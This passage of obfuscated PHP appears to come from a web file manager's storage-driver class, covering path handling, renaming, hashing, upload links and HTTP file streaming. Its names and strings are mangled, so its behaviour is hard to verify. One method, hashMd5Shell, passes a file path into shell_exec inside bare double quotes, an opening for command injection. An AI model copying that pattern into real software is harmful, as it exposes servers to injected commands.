$ÎÒ¡™§ =& $_SERVER[ì…™Î¶Ï]; if (!$¼ıÎ§‘À || !function_exists($ÎÒ¡™§[69])) { return $¼ıÎ§‘À; } static $è¯Ä«ï˜ = array(); $×¯ãÂü€ = $€½øÄÚ¾ . $ÎÒ¡™§[70] . $Î‚´Ğ‘ . $ÎÒ¡™§[71] . $¼ıÎ§‘À; if (isset($è¯Ä«ï˜[$×¯ãÂü€])) { return $è¯Ä«ï˜[$×¯ãÂü€]; } if (function_exists($ÎÒ¡™§[72])) { $óˆ°˜ = @mb_convert_encoding($¼ıÎ§‘À, $Î‚´Ğ‘, $€½øÄÚ¾); } else { $óˆ°˜ = @iconv($€½øÄÚ¾, $Î‚´Ğ‘, $¼ıÎ§‘À); } $óˆ°˜ = $óˆ°˜ ? $óˆ°˜ : $¼ıÎ§‘À; if (strstr($óˆ°˜, $ÎÒ¡™§[73])) { $óˆ°˜ = str_replace($ÎÒ¡™§[73], $ÎÒ¡™§[11], $óˆ°˜); } $è¯Ä«ï˜[$€½øÄÚ¾ . $ÎÒ¡™§[70] . $Î‚´Ğ‘ . $ÎÒ¡™§[71] . $¼ıÎ§‘À] = $óˆ°˜; $è¯Ä«ï˜[$Î‚´Ğ‘ . $ÎÒ¡™§[70] . $€½øÄÚ¾ . $ÎÒ¡™§[71] . $¼ıÎ§‘À] = $¼ıÎ§‘À; $è¯Ä«ï˜[$Î‚´Ğ‘ . $ÎÒ¡™§[70] . $€½øÄÚ¾ . $ÎÒ¡™§[71] . $óˆ°˜] = $¼ıÎ§‘À; $è¯Ä«ï˜[$€½øÄÚ¾ . $ÎÒ¡™§[70] . $Î‚´Ğ‘ . $ÎÒ¡™§[71] . $óˆ°˜] = $óˆ°˜; return $óˆ°˜; } public function getPathInner($ğí¹°¾) { $ÄûâÌ ¢ = IO::init($ğí¹°¾); return $ÄûâÌ ¢->path; } public function getPathOuter($ÇæíÎÀô) { $ÉÈÒãåÛ =& $_SERVER[ì…™Î¶Ï]; $¨öºØˆİ = strlen(trim($this->pathBase, $ÉÈÒãåÛ[8])); $ÇæíÎÀô = substr(trim($ÇæíÎÀô, $ÉÈÒãåÛ[8]), $¨öºØˆİ); return $this->pathDriver . $ÉÈÒãåÛ[8] . ltrim($ÇæíÎÀô, $ÉÈÒãåÛ[8]); } public function isParentOf($ÒŸ˜¿¥, $ÇÉ´ïÃä) { $Â¡“óúÀ =& $_SERVER[ì…™Î¶Ï]; $ÒŸ˜¿¥ = rtrim(strtolower($ÒŸ˜¿¥), $Â¡“óúÀ[8]) . $Â¡“óúÀ[8]; $ÇÉ´ïÃä = rtrim(strtolower($ÇÉ´ïÃä), $Â¡“óúÀ[8]) . $Â¡“óúÀ[8]; $»Ó¼Õ²Ú = strpos($ÇÉ´ïÃä, $ÒŸ˜¿¥) === 0; return $»Ó¼Õ²Ú; } public function getType() { $úç£Æ™’ =& $_SERVER[ì…™Î¶Ï]; $¥°¾É¦ = str_replace($úç£Æ™’[74], $úç£Æ™’[12], get_class($this)); return strtolower($¥°¾É¦); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($®•â—Š¼, $ éã—Í“) { $…ªÛıæ® =& $_SERVER[ì…™Î¶Ï]; $ËÅ²§³ = rtrim($®•â—Š¼, $…ªÛıæ®[8]) . $…ªÛıæ®[8] . $ éã—Í“; $Ù…¸¼« = $this->exist($ËÅ²§³); return $Ù…¸¼« ? $ËÅ²§³ : !1; } public function setModifyTime($²ãşÛ…ª, $‘üŞŠ¼³ = '') { } public function renameObject($˜›Äê, $ÛÂ°íÑ) { $÷Ï¥·Êµ =& $_SERVER[ì…™Î¶Ï]; $©×½â¦Ø = $ÛÂ°íÑ; Hook::trigger($÷Ï¥·Êµ[75], $this, $˜›Äê, $this, $this->pathFather($˜›Äê) . $ÛÂ°íÑ); $˜›Äê = $this->getPathOuter($˜›Äê); $ÛÂ°íÑ = $this->pathFather($˜›Äê) . $ÛÂ°íÑ; if (IO::isFile($˜›Äê)) { $£ÉŒø¼Œ = IO::copy($˜›Äê, $this->pathFather($˜›Äê), REPEAT_RENAME_FOLDER, $©×½â¦Ø); if ($£ÉŒø¼Œ) { IO::remove($˜›Äê); } } else { $£ÉŒø¼Œ = IO::mkdir($ÛÂ°íÑ); if (!$£ÉŒø¼Œ) { return !1; } $ÅšÊĞÇä = IO::listPath($˜›Äê, !0); $¬Ö¯–Úó = array_merge($ÅšÊĞÇä[$÷Ï¥·Êµ[76]], $ÅšÊĞÇä[$÷Ï¥·Êµ[77]]); foreach ($¬Ö¯–Úó as $üÇÛçøã) { IO::move($üÇÛçøã[$÷Ï¥·Êµ[78]], $ÛÂ°íÑ, REPEAT_RENAME_FOLDER); } IO::remove($˜›Äê); } return $£ÉŒø¼Œ ? $ÛÂ°íÑ : !1; } public function tempFile($î¬êèïí = '', $ÖÂ‰Ÿ¯õ = '') { if (!$î¬êèïí) { $î¬êèïí = rand_string(15); } $úÙ”’Š = TEMP_FILES . rand_string(15) . $_SERVER[ì…™Î¶Ï][8]; @mkdir($úÙ”’Š, DEFAULT_PERRMISSIONS, !0); $†€ñªò = $úÙ”’Š . $î¬êèïí; @touch($†€ñªò); if ($ÖÂ‰Ÿ¯õ) { file_put_contents($†€ñªò, $ÖÂ‰Ÿ¯õ); } return $†€ñªò; } public function tempFileRemve($œ”á¡Òç) { @unlink($œ”á¡Òç); @rmdir($this->pathFather($œ”á¡Òç)); } public function mkfile($ü·ö”Ş, $·÷‰É´¹ = '', $ŠòğÁöÏ = REPEAT_RENAME) { } public function mkdir($Òó½Ü¯ã, $Í®¯¨…ñ = REPEAT_SKIP) { } public function delFile($ûÈÖ™œ…) { } public function delFolder($—¥´¬ó) { } public function copyFile($Ì½¬‡, $‹¤ë££¼) { } public function moveFile($®Îé’—, $›á‰£‰“) { } public function remove($‡Š©¢Ë) { if ($this->isFile($‡Š©¢Ë)) { return $this->delFile($‡Š©¢Ë); } return $this->delFolder($‡Š©¢Ë); } public function rename($Ü™‰³Şİ, $¾æ êÅ™) { } public function exist($Ê¼¯­áÓ) { } public function findByHash($à“˜äª = '', $Ôüµù¿… = '') { return !1; } public function isFile($Öñüµ¥ò) { } public function isFolder($Ô³ ãÌØ) { } public function size($İÚä÷Ğ) { } public function info($ÏÖœáĞ‰) { } public function infoSimple($Öå“†­Ş) { return $this->info($Öå“†­Ş); } public function infoAuth($‡•±í¼ß) { return $this->info($‡•±í¼ß); } public function infoFull($ğ˜ªî›„) { return $this->info($ğ˜ªî›„); } public function infoWithChildren($õÅë€Õé) { $ùÂÚÀÄ =& $_SERVER[ì…™Î¶Ï]; static $ÔÖ¤ˆ²‚ = array(); if (isset($ÔÖ¤ˆ²‚[$õÅë€Õé])) { return $ÔÖ¤ˆ²‚[$õÅë€Õé]; } $´ “¶ = $this->info($õÅë€Õé); if ($´ “¶ && $´ “¶[$ùÂÚÀÄ[33]] == $ùÂÚÀÄ[79]) { $ŠìÅëÔ– = array($ùÂÚÀÄ[80] => 0, $ùÂÚÀÄ[81] => 0, $ùÂÚÀÄ[82] => 0); $this->infoChildren($õÅë€Õé, $ŠìÅëÔ–); $´ “¶[$ùÂÚÀÄ[80]] = $ŠìÅëÔ–[$ùÂÚÀÄ[80]]; $´ “¶[$ùÂÚÀÄ[83]] = array($ùÂÚÀÄ[84] => $ŠìÅëÔ–[$ùÂÚÀÄ[81]], $ùÂÚÀÄ[85] => $ŠìÅëÔ–[$ùÂÚÀÄ[82]]); $ÔÖ¤ˆ²‚[$õÅë€Õé] = $´ “¶; } return $´ “¶; } public function listPath($ğê®˜¨â, $äêÏ€×ˆ = false) { } public function has($›ˆÁÄ¿, $Ü¬Ş­—½ = false, $œ„¸¼Æ¤ = false) { } public function canRead($ä»Ï×Ùç) { } public function canWrite($²¨´®Ê¾) { } public function getContent($ú³¿ä™Ã) { } public function setContent($ÂŒÉúÑ, $¥ğÉùõ´ = '') { } protected function infoChildren($ŞİÜ±Ñà, &$Äæñ®îŞ) { $ùÜûá¿š =& $_SERVER[ì…™Î¶Ï]; check_abort_echo(); $©Õ—„¨á = $this->listPath($ŞİÜ±Ñà, !0); $©Õ—„¨á = array_merge($©Õ—„¨á[$ùÜûá¿š[77]], $©Õ—„¨á[$ùÜûá¿š[76]]); foreach ($©Õ—„¨á as $†—¼ë±) { if ($†—¼ë±[$ùÜûá¿š[33]] == $ùÜûá¿š[79]) { $Äæñ®îŞ[$ùÜûá¿š[82]]++; $¤°æğüî = $this->getPathInner($†—¼ë±[$ùÜûá¿š[78]]); $this->infoChildren($¤°æğüî, $Äæñ®îŞ); } else { $Äæñ®îŞ[$ùÜûá¿š[81]]++; $Äæñ®îŞ[$ùÜûá¿š[80]] += $†—¼ë±[$ùÜûá¿š[80]]; } } } public function fileSubstr($”ˆ€ö«„, $ÄŸî®™, $¼™—ç’û) { } public function listAll($”ºüûĞŸ) { } public function listAllMake($ñ¾ªã³, &$±¨˜Á†Ó) { $€…¿¢€Å =& $_SERVER[ì…™Î¶Ï]; check_abort_echo(); $ñšÕ–Ş¸ = $this->listPath($ñ¾ªã³, !0); if (!$ñšÕ–Ş¸) { return; } $²±ûú¥Å = array_merge($ñšÕ–Ş¸[$€…¿¢€Å[77]], $ñšÕ–Ş¸[$€…¿¢€Å[76]]); foreach ($²±ûú¥Å as $¼÷Çá™ò) { $Õ˜­Áé‡ = $¼÷Çá™ò[$€…¿¢€Å[33]] == $€…¿¢€Å[79]; $ÔŒœÁÜ = array($€…¿¢€Å[78] => $¼÷Çá™ò[$€…¿¢€Å[78]], $€…¿¢€Å[79] => $Õ˜­Áé‡); if (isset($¼÷Çá™ò[$€…¿¢€Å[80]])) { $ÔŒœÁÜ[$€…¿¢€Å[80]] = $¼÷Çá™ò[$€…¿¢€Å[80]]; } if (isset($¼÷Çá™ò[$€…¿¢€Å[86]])) { $ÔŒœÁÜ[$€…¿¢€Å[86]] = $¼÷Çá™ò[$€…¿¢€Å[86]]; } if (!$Õ˜­Áé‡) { $±¨˜Á†Ó[] = $ÔŒœÁÜ; continue; } $±¨˜Á†Ó[] = $ÔŒœÁÜ; $£É‹î‰å = $¼÷Çá™ò[$€…¿¢€Å[78]]; $ë™ÊÆÕÖ = $this->pathDriver; if (substr($¼÷Çá™ò[$€…¿¢€Å[78]], 0, strlen($ë™ÊÆÕÖ)) == $ë™ÊÆÕÖ) { $£É‹î‰å = substr($£É‹î‰å, strlen($ë™ÊÆÕÖ)); } $this->listAllMake($£É‹î‰å, $±¨˜Á†Ó); } } public function listAllSimple($Ìé„»‡Ì) { $ÇÂä²Ş =& $_SERVER[ì…™Î¶Ï]; $´èçóñ = array(); $Ÿ«––Ø— = $this->listAll($Ìé„»‡Ì); $²ùôïñ¯ = $this->getPathOuter($Ìé„»‡Ì); foreach ($Ÿ«––Ø— as $ãØéàÁˆ) { $‹á¤ºÛê = $ãØéàÁˆ[$ÇÂä²Ş[78]]; $´ä¹¶ëŸ = $ãØéàÁˆ[$ÇÂä²Ş[78]]; if (isset($ãØéàÁˆ[$ÇÂä²Ş[87]])) { $‹á¤ºÛê = $ãØéàÁˆ[$ÇÂä²Ş[87]][$ÇÂä²Ş[78]]; $ãØéàÁˆ[$ÇÂä²Ş[80]] = $ãØéàÁˆ[$ÇÂä²Ş[87]][$ÇÂä²Ş[80]]; $ãØéàÁˆ[$ÇÂä²Ş[86]] = $ãØéàÁˆ[$ÇÂä²Ş[87]][$ÇÂä²Ş[86]]; } else { $´ä¹¶ëŸ = substr($ãØéàÁˆ[$ÇÂä²Ş[78]], strlen(get_path_father($²ùôïñ¯))); $´ä¹¶ëŸ = $ÇÂä²Ş[8] . ltrim($´ä¹¶ëŸ, $ÇÂä²Ş[8]); } $”Öìò÷ê = array($ÇÂä²Ş[78] => $´ä¹¶ëŸ, $ÇÂä²Ş[79] => $ãØéàÁˆ[$ÇÂä²Ş[79]]); if (isset($ãØéàÁˆ[$ÇÂä²Ş[80]]) && !$ãØéàÁˆ[$ÇÂä²Ş[79]]) { $”Öìò÷ê[$ÇÂä²Ş[80]] = $ãØéàÁˆ[$ÇÂä²Ş[80]]; } if (isset($ãØéàÁˆ[$ÇÂä²Ş[86]])) { $”Öìò÷ê[$ÇÂä²Ş[86]] = $ãØéàÁˆ[$ÇÂä²Ş[86]]; } if (!$ãØéàÁˆ[$ÇÂä²Ş[79]]) { $”Öìò÷ê[$ÇÂä²Ş[88]] = $‹á¤ºÛê; } $´èçóñ[] = $”Öìò÷ê; } return $´èçóñ; } public function upload($ÄèÌÎÖÏ, $»é¾äè, $ÉµÏíµ = false, $ õŸî°É = REPEAT_REPLACE) { } public function uploadFileByID($°àïÔÉò, $Éçƒ‹øÃ, $œçá™Ÿ÷) { } public function uploadFileByPath($‹Àï¥Àœ, $³“²¥™Á, $õµ×­Ç’ = array()) { } public function isUploadServer() { $ş‚Üüàª =& $_SERVER[ì…™Î¶Ï]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $ş‚Üüàª[89]) { return !0; } return $GLOBALS[$ş‚Üüàª[6]][$ş‚Üüàª[90]][$ş‚Üüàª[91]]; } public function isFileOutServer() { $‰°¦İ¼ =& $_SERVER[ì…™Î¶Ï]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $‰°¦İ¼[89]) { return !0; } return $GLOBALS[$‰°¦İ¼[6]][$‰°¦İ¼[90]][$‰°¦İ¼[92]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ã®°úÍû) { $Í­î”³ü =& $_SERVER[ì…™Î¶Ï]; if (!$this->isCdnHost()) { return $ã®°úÍû; } return str_replace(trim(get_url_root($ã®°úÍû), $Í­î”³ü[8]), trim($this->cdnHost, $Í­î”³ü[8]), $ã®°úÍû); } public function uploadLink($—ŞĞİ±à, $å››û = 0) { $ÔÇÊ¬ — =& $_SERVER[ì…™Î¶Ï]; if ($this->isUploadServer()) { return; } $ù«ï´ë = $this->getType(); if (!in_array($ù«ï´ë, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¨‘ÓÆ®º = 1024 * 1024 * 10; $¥™£ñ¯“ = $å››û <= $¨‘ÓÆ®º ? $ÔÇÊ¬ —[93] : $ÔÇÊ¬ —[94]; $±°À›˜§ = (!$å››û ? 1 : ceil($å››û / pow(1024, 3))) * 3600 * 4; $æ¥š¤ = $this->{$¥™£ñ¯“}($—ŞĞİ±à, $±°À›˜§); if ($æ¥š¤) { $æ¥š¤[$ÔÇÊ¬ —[95]] = $—ŞĞİ±à; $æ¥š¤[$ÔÇÊ¬ —[96]] = $ù«ï´ë; } return $æ¥š¤; } public function uploadFormData($ÒØ²¤ûè, $Üƒ”¶¿ş = 3600) { } public function multiUploadFormData($™ÏòÙÂ, $Õãœ»ëÄ = 3600) { } public function download($Âú×¨µ, $ëñş‡şØ) { } public function ext($ıÉ«º¾) { $‹¯ù¨‹ =& $_SERVER[ì…™Î¶Ï]; if (strpos($ıÉ«º¾, $‹¯ù¨‹[8]) === -1) { $Ø’ı¶ê¬ = $ıÉ«º¾; } else { $Ø’ı¶ê¬ = $this->pathThis($ıÉ«º¾); } $±ï’Æğ˜ = $‹¯ù¨‹[12]; if (strstr($Ø’ı¶ê¬, $‹¯ù¨‹[10])) { $±ï’Æğ˜ = substr($Ø’ı¶ê¬, strrpos($Ø’ı¶ê¬, $‹¯ù¨‹[10]) + 1); $±ï’Æğ˜ = strtolower($±ï’Æğ˜); } if (strlen($±ï’Æğ˜) > 3 && preg_match($‹¯ù¨‹[97], $±ï’Æğ˜, $œ¥Á§€€)) { $±ï’Æğ˜ = $‹¯ù¨‹[12]; } return $±ï’Æğ˜; } public function pathThis($Áæ›İÕ) { $Ë£¤¸ûã =& $_SERVER[ì…™Î¶Ï]; $Áæ›İÕ = str_replace($Ë£¤¸ûã[98], $Ë£¤¸ûã[8], rtrim($Áæ›İÕ, $Ë£¤¸ûã[8])); $îÑ½•ª± = strrpos($Áæ›İÕ, $Ë£¤¸ûã[8]); if ($îÑ½•ª± === !1) { return $Áæ›İÕ; } return substr($Áæ›İÕ, $îÑ½•ª± + 1); } public function pathFather($è•®éæĞ) { $ÛÔƒúÁ =& $_SERVER[ì…™Î¶Ï]; $è•®éæĞ = str_replace($ÛÔƒúÁ[98], $ÛÔƒúÁ[8], rtrim($è•®éæĞ, $ÛÔƒúÁ[8])); $èŞªÙ­ = strrpos($è•®éæĞ, $ÛÔƒúÁ[8]); if ($èŞªÙ­ === !1) { return $ÛÔƒúÁ[12]; } return substr($è•®éæĞ, 0, $èŞªÙ­ + 1); } public function hashSimple($ñÆş) { $ ÍÓ¿ü =& $_SERVER[ì…™Î¶Ï]; if (!$ñÆş) { return md5($ ÍÓ¿ü[12]); } $­Ÿäñº = $this->size($ñÆş); $ïâñİØ­ = 200; $óÊñ˜Í¶ = 50; if ($­Ÿäñº <= $ïâñİØ­ * $óÊñ˜Í¶) { return $this->hashMd5($ñÆş) . $­Ÿäñº; } $¸ßìÎ±Î = intval($­Ÿäñº / $óÊñ˜Í¶); $û­êÛ¶ = $ ÍÓ¿ü[12]; for ($¢š‡Ìö = 0; $¢š‡Ìö < $óÊñ˜Í¶; $¢š‡Ìö++) { $û­êÛ¶ .= $this->fileSubstr($ñÆş, $¸ßìÎ±Î * $¢š‡Ìö, $ïâñİØ­); } $û­êÛ¶ .= $this->fileSubstr($ñÆş, $­Ÿäñº - $ïâñİØ­, $ïâñİØ­); return md5($û­êÛ¶) . $­Ÿäñº; } public static $md5Cache = array(); public function hashMd5($…Äêñ•œ) { if (!$…Äêñ•œ) { return md5($_SERVER[ì…™Î¶Ï][12]); } $…Äêñ•œ = $this->iconvSystem($…Äêñ•œ); if (isset(self::$md5Cache[$…Äêñ•œ])) { return self::$md5Cache[$…Äêñ•œ]; } self::$md5Cache[$…Äêñ•œ] = $this->hashMd5Shell($…Äêñ•œ); if (!self::$md5Cache[$…Äêñ•œ]) { self::$md5Cache[$…Äêñ•œ] = @md5_file($…Äêñ•œ); } return self::$md5Cache[$…Äêñ•œ]; } private function hashMd5Shell($Ã¨•ïÚı) { $ˆ¡ÛÚî° =& $_SERVER[ì…™Î¶Ï]; if (!$Ã¨•ïÚı) { return md5($ˆ¡ÛÚî°[12]); } if (!function_exists($ˆ¡ÛÚî°[99])) { return !1; } $ˆÎçú…ñ = array($ˆ¡ÛÚî°[100], $ˆ¡ÛÚî°[101]); $ô¢“Ï ‰ = Cache::get($ˆ¡ÛÚî°[102]); if (!$ô¢“Ï ‰) { $×Î²ÂÖş = BASIC_PATH . $ˆ¡ÛÚî°[103]; $Û·şäÀ = md5_file($×Î²ÂÖş); $ô¢“Ï ‰ = $ˆ¡ÛÚî°[104]; foreach ($ˆÎçú…ñ as $ğ…­¾œ) { $ÆÙ¿ –— = shell_exec($ğ…­¾œ . "\x20\x22{$×Î²ÂÖş}\42"); if ($ÆÙ¿ –— && substr(trim($ÆÙ¿ –—), 0, 32) == $Û·şäÀ) { $ô¢“Ï ‰ = $ğ…­¾œ; break; } } Cache::set($ˆ¡ÛÚî°[102], $ô¢“Ï ‰, 3600); } if ($ô¢“Ï ‰ == $ˆ¡ÛÚî°[104]) { return !1; } $ÆÙ¿ –— = shell_exec($ô¢“Ï ‰ . "\40\42{$Ã¨•ïÚı}\x22"); $ÆÙ¿ –— = str_replace($ˆ¡ÛÚî°[105], $ˆ¡ÛÚî°[12], $ÆÙ¿ –—); return substr($ÆÙ¿ –—, 0, 32); } public function link($–˜Œô»Ğ) { return $–˜Œô»Ğ; } public function fileOut($ñ£«â‹Ô, $ï·Şû½ğ = false, $£ÔºšòÌ = false, $ğşß’ĞÍ = '') { $ÒÄ²ÜËé =& $_SERVER[ì…™Î¶Ï]; $this->cacheMethod(null, null); if (!$ñ£«â‹Ô || !$this->exist($ñ£«â‹Ô)) { show_json(LNG($ÒÄ²ÜËé[106]), !1, $£ÔºšòÌ); } $üŸÓ¿« = $this->getType() == $ÒÄ²ÜËé[107]; $¤èêÙÜæ = $GLOBALS[$ÒÄ²ÜËé[6]][$ÒÄ²ÜËé[90]][$ÒÄ²ÜËé[108]][$ÒÄ²ÜËé[109]]; $ûìú¬ïÃ = (double) $GLOBALS[$ÒÄ²ÜËé[6]][$ÒÄ²ÜËé[90]][$ÒÄ²ÜËé[108]][$ÒÄ²ÜËé[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $¾İ“´Á = $this->infoFull($ñ£«â‹Ô); $ÉÍÎ—„” = $¾İ“´Á[$ÒÄ²ÜËé[80]]; $ªÊÂ«ˆù = gmdate($ÒÄ²ÜËé[111], $¾İ“´Á[$ÒÄ²ÜËé[86]]); $Í»ˆÑÃÀ = $£ÔºšòÌ ? $£ÔºšòÌ : $this->iconvApp($¾İ“´Á[$ÒÄ²ÜËé[32]]); $„ãšø‰³ = 0; $İõ–½ó¢ = $ÉÍÎ—„” - 1; $ÄÎÉô‘ğ = $this->ext($Í»ˆÑÃÀ); if (in_array($ÄÎÉô‘ğ, array($ÒÄ²ÜËé[112], $ÒÄ²ÜËé[113], $ÒÄ²ÜËé[114], $ÒÄ²ÜËé[115]))) { $ÄÎÉô‘ğ = $ÒÄ²ÜËé[116]; } if (!$ğşß’ĞÍ) { $ğşß’ĞÍ = md5($ªÊÂ«ˆù . $this->hashSimple($ñ£«â‹Ô)); } $ğşß’ĞÍ = $ÒÄ²ÜËé[117] . $ğşß’ĞÍ . $ÒÄ²ÜËé[117]; $¯˜Æ€ç… = get_file_mime($ÄÎÉô‘ğ); if ($ï·Şû½ğ === !1 && !mime_support($¯˜Æ€ç…)) { $ï·Şû½ğ = !0; $¯˜Æ€ç… = $ÒÄ²ÜËé[118]; } header($ÒÄ²ÜËé[119]); header($ÒÄ²ÜËé[120] . $¯˜Æ€ç…); $£‚‡˜æÒ = rawurlencode($Í»ˆÑÃÀ); $£‚‡˜æÒ = $ÒÄ²ÜËé[117] . $£‚‡˜æÒ . $ÒÄ²ÜËé[121] . $£‚‡˜æÒ; if ($ï·Şû½ğ) { header($ÒÄ²ÜËé[122]); header($ÒÄ²ÜËé[123] . $£‚‡˜æÒ); } else { } header($ÒÄ²ÜËé[124] . gmdate($ÒÄ²ÜËé[111], time() + 3600 * 24 * 30) . $ÒÄ²ÜËé[125]); header($ÒÄ²ÜËé[126]); header($ÒÄ²ÜËé[127]); header($ÒÄ²ÜËé[128]); if (isset($_SERVER[$ÒÄ²ÜËé[129]]) && strtotime($_SERVER[$ÒÄ²ÜËé[129]]) == $¾İ“´Á[$ÒÄ²ÜËé[86]]) { header($ÒÄ²ÜËé[130], !0, 304); die; } if (isset($_SERVER[$ÒÄ²ÜËé[131]]) && $_SERVER[$ÒÄ²ÜËé[131]] == $ğşß’ĞÍ) { header($ÒÄ²ÜËé[132] . $ğşß’ĞÍ, !0, 304); die; } header($ÒÄ²ÜËé[132] . $ğşß’ĞÍ); header($ÒÄ²ÜËé[133] . $ªÊÂ«ˆù . $ÒÄ²ÜËé[125]); header($ÒÄ²ÜËé[134] . $Í»ˆÑÃÀ); header($ÒÄ²ÜËé[135]); header($ÒÄ²ÜËé[136] . $ÉÍÎ—„”); header($ÒÄ²ÜËé[137]); if (!$ï·Şû½ğ && $ÄÎÉô‘ğ == $ÒÄ²ÜËé[138]) { if ($ÉÍÎ—„” > 1024 * 1024 * 5) { die; } $İğ±ÛÒ“ = $this->getContent($ñ£«â‹Ô); $İğ±ÛÒ“ = Html::clearSVG($İğ±ÛÒ“); header($ÒÄ²ÜËé[139] . strlen($İğ±ÛÒ“)); echo $İğ±ÛÒ“; die; } $”ß™Ùò = strtolower($_SERVER[$ÒÄ²ÜËé[140]]); if ($üŸÓ¿« && $”ß™Ùò && $¤èêÙÜæ) { if (strstr($”ß™Ùò, $ÒÄ²ÜËé[141])) { header($ÒÄ²ÜËé[142] . $ñ£«â‹Ô); } else { if (strstr($”ß™Ùò, $ÒÄ²ÜËé[143])) { header($ÒÄ²ÜËé[144] . $ñ£«â‹Ô); } else { if (strstr($”ß™Ùò, $ÒÄ²ÜËé[145])) { header($ÒÄ²ÜËé[146] . $ñ£«â‹Ô); } } } if ($ûìú¬ïÃ) { header($ÒÄ²ÜËé[147] . $ûìú¬ïÃ); } return; } if (isset($_SERVER[$ÒÄ²ÜËé[148]])) { if (preg_match($ÒÄ²ÜËé[149], $_SERVER[$ÒÄ²ÜËé[148]], $­„„”µ¤)) { $„ãšø‰³ = intval($­„„”µ¤[1]); if (!empty($­„„”µ¤[2])) { $İõ–½ó¢ = intval($­„„”µ¤[2]); } } header($ÒÄ²ÜËé[150]); header("\103\157\x6e\164\145\156\164\x2d\122\141\156\147\x65\72\40\142\x79\164\x65\x73\x20{$„ãšø‰³}\55{$İõ–½ó¢}\57" . $ÉÍÎ—„”); } else { header($ÒÄ²ÜËé[151]); } header($ÒÄ²ÜËé[152]); $â¨ñİî = !0; if ($_SERVER[$ÒÄ²ÜËé[153]] == $ÒÄ²ÜËé[154] && $ÉÍÎ—„” > 1204 * 1024 * 1024 * 2) { $â¨ñİî = !1; } if ($â¨ñİî) { header($ÒÄ²ÜËé[155] . ($İõ–½ó¢ - $„ãšø‰³ + 1)); } if ($_SERVER[$ÒÄ²ÜËé[156]] == $ÒÄ²ÜËé[157]) { return; } $‡¡‚ÓÊÒ = 1024 * 100; $ğ´ÜÍ÷  = 0; if ($ûìú¬ïÃ) { $ğ´ÜÍ÷  = intval(1000 * 1000 * ($‡¡‚ÓÊÒ / $ûìú¬ïÃ)); } while ($„ãšø‰³ <= $İõ–½ó¢) { $Ûî•àÈ = timeFloat(); check_abort(); $¸ó—óñ• = $İõ–½ó¢ - $„ãšø‰³ + 1; if ($¸ó—óñ• <= $‡¡‚ÓÊÒ) { $‡¡‚ÓÊÒ = $¸ó—óñ•; } echo $this->fileSubstr($ñ£«â‹Ô, $„ãšø‰³, $‡¡‚ÓÊÒ); $„ãšø‰³ += $‡¡‚ÓÊÒ; if ($‡¡‚ÓÊÒ == $¸ó—óñ•) { $„ãšø‰³ = $İõ–½ó¢ + 1; } if ($ğ´ÜÍ÷ ) { $‰ÁÓÒ© = intval(1000 * 1000 * (timeFloat() - $Ûî•àÈ)); $”ê° ªï = $ğ´ÜÍ÷  - $‰ÁÓÒ©; if ($”ê° ªï > 5) { usleep($”ê° ªï); } } } } public function fileOutServer($½œÒÃÆ´, $Ùñ‘ˆ‹Æ = false, $ÀØİ“ıø = false, $©¤“ß´¹ = '') { $this->fileOut($½œÒÃÆ´, $Ùñ‘ˆ‹Æ, $ÀØİ“ıø, $©¤“ß´¹); } public function fileOutLink($üñÕªúç) { header($_SERVER[ì…™Î¶Ï][158] . $üñÕªúç); die; } public function cacheMethod($ô¿ŸÖ¦ğ, $ÇÜõéş×, $¿—“‘¯× = null) { $¿ÇÛ¶ =& $_SERVER[ì…™Î¶Ï]; static $Òª³Û¾Ú = array(); $Ø Ä—ó¹ = $ÇÜõéş× ? ltrim($this->getPathOuter($ÇÜõéş×), $¿ÇÛ¶[8]) : $ÇÜõéş×; $ûö“ã©À = $¿ÇÛ¶[159] . $ô¿ŸÖ¦ğ . $¿ÇÛ¶[160] . rtrim($Ø Ä—ó¹, $¿ÇÛ¶[8]); if (is_null($ô¿ŸÖ¦ğ)) { $Òª³Û¾Ú = array(); return; } if (is_null($ÇÜõéş×)) { unset($Òª³Û¾Ú[$ûö“ã©À]); return; } if (!is_null($¿—“‘¯×)) { $Òª³Û¾Ú[$ûö“ã©À] = $¿—“‘¯×; return; } $Ù„¯Ì–€ = isset($Òª³Û¾Ú[$ûö“ã©À]) ? $Òª³Û¾Ú[$ûö“ã©À] : null; if (!is_null($Ù„¯Ì–€)) { return $Ù„¯Ì–€; } $Ù„¯Ì–€ = $this->{$ô¿ŸÖ¦ğ}($ÇÜõéş×); $Òª³Û¾Ú[$ûö“ã©À] = $Ù„¯Ì–€; return $Ù„¯Ì–€; } public function fileOutImage($şƒÂö¥Ë, $á¸ÎÒğš = 250) { $å´áæÉİ =& $_SERVER[ì…™Î¶Ï]; set_timeout(); if (substr($şƒÂö¥Ë, 0, 4) == $å´áæÉİ[145]) { $this->fileOutLink($şƒÂö¥Ë); } $’±ŞÈ’ = $this->info($şƒÂö¥Ë); $úèãÏÔà = $’±ŞÈ’[$å´áæÉİ[32]]; $ÚäÑÔÀÈ = !1; if (isset($GLOBALS[$å´áæÉİ[161]]) && $GLOBALS[$å´áæÉİ[161]][$å´áæÉİ[78]] == $’±ŞÈ’[$å´áæÉİ[78]]) { $Á¦§ó£ = $GLOBALS[$å´áæÉİ[161]][$å´áæÉİ[162]]; if (!$’±ŞÈ’[$å´áæÉİ[163]]) { $’±ŞÈ’[$å´áæÉİ[163]] = $GLOBALS[$å´áæÉİ[161]]; } if (isset($Á¦§ó£[$å´áæÉİ[164]])) { if ($Á¦§ó£[$å´áæÉİ[164]] <= $á¸ÎÒğš && $Á¦§ó£[$å´áæÉİ[165]] <= $á¸ÎÒğš) { $ÚäÑÔÀÈ = !0; } } $úèãÏÔà = $’±ŞÈ’[$å´áæÉİ[163]][$å´áæÉİ[32]]; } if ($’±ŞÈ’[$å´áæÉİ[80]] <= 1024 * 50 || $ÚäÑÔÀÈ || !function_exists($å´áæÉİ[166]) || $’±ŞÈ’[$å´áæÉİ[167]] == $å´áæÉİ[168]) { return $this->fileOut($şƒÂö¥Ë, !1, $úèãÏÔà); } if (isset($’±ŞÈ’[$å´áæÉİ[163]][$å´áæÉİ[169]])) { $«Ï½ò„ = $’±ŞÈ’[$å´áæÉİ[163]][$å´áæÉİ[169]]; } else { if (isset($’±ŞÈ’[$å´áæÉİ[163]][$å´áæÉİ[170]])) { 